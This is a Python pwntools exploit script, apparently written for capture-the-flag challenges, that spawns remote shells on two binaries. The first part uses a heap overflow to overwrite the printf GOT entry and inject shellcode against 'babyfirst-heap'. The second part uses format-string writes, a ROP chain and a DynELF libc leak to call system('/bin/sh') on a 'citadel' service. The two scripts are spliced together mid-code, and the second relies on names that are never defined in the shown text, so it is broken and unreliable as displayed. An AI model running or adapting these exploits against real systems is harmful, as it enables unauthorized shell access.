#!/usr/bin/env python2

from pwn import *

# Setup goodies
context(os = 'linux', arch = 'i386')
elf = ELF('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
rop = ROP(elf)

# Demo should work even without a HOST
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
     r = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')

# Skip header
r.recvuntil('address.\n')

# Receive the heap locations
addrs = []
for n in range(20):
    r.recvuntil('loc=')
    loc = r.recvuntil(']')[:-1]
    addrs.append(int(loc, 16))
    r.recvline()

# Send heap overflow
r.sendline(flat(
    elf.got['printf'] - 8,
    addrs[10] + 8,
    asm('jmp $ + 8'),
    'AAAAAA',
    asm(shellcraft.sh()),
    'B'*500
))

# GO!
r.clean()
r.interactive()
      r = remote(HOST, PORT)

def do_register(name, to):
    r.sendline('REGISTER FOO GITSSIP/1.0')
    r.sendline('Common Name: ' + name)
    r.sendline('To: ' + to)
    r.sendline('From: ' + 'A')
    r.sendline('Expires: ' + 'A')
    r.sendline('Contact: ' + 'A')
    r.sendline('')

def do_directory_search(what):
    r.sendline('DIRECTORY FOO GITSSIP/1.0')
    r.sendline('Search: ' + what)

#Leak the stack address
do_register("A", "%44$p")
do_directory_search("*")

r.recvuntil('To: 0x')

addr = int(r.recvuntil(',')[:-1], 16)
#address of the return address of the function that handles directory requests
ret_addr = addr - 312

#Abuse asprintf to write our rop to the stack, when doing a search for *
def put_rop(rop1):
    for n, c in enumerate(rop1):
        name = randoms(7, string.letters) + p64(ret_addr + n).rstrip('\x00')
        already_printed = len("%d : [Status: IDLE, To: " % n)
        to_print = ord(c) - already_printed
        if to_print <= 0:
            to_print += 256

        assert '\n' not in name
        do_register(name, "%" + str(to_print) + "d%9$n")

#Do one leak by ropping to send and recv
@MemLeak
def leaker(addr, length = None):
    try:
        new_conn()

        length = 0x7e

        # pivot to get to buf
        rop1 = flat(pop_rsp_r13_r14_r15, buf - 3*8)

        # just a rop chain to recieve an address and leak some memory
        # placed at buf
        rop2 = flat(
            pop_rsi_r15, null_bytes - 0x55, 0,
            pop_rdi, writable - 0x50,
            mov_rcx_rsi55,
            pop_rdi, 4,
            pop_rsi_r15, 0x613258, 0,
            pop_rdx, 8,
            recv,
            pop_rsi_r15, null_bytes - 0x55, 0,
            pop_rdi, writable - 0x50,
            mov_rcx_rsi55,
            pop_rdi, 4,
            pop_rsi_r15, 0, 0,
            pop_rdx, length,
            send,
        )

        put_rop(rop1)
        do_register(rop2, "A")
        do_directory_search("*")

        r.recvuntil('16 : [')
        r.recvuntil(']')
        r.send(p64(addr))
        return r.recvn(length)
    except EOFError:
        return None

#Use DynELF to get the address from system, by using the leaker.

d = DynELF(leaker, elf = ELF('./citadel'))
system = d.lookup('system', "libc.so")

new_conn()

rop1 = flat(
    pop_rdi, buf,
    system,
)

put_rop(rop1)
do_register("/bin/sh <&4 >&4 2>&4 &", "A")
do_directory_search("*")

r.recvuntil(" &]")

#And we have shell!
r.interactive()

if service:
    service.close()
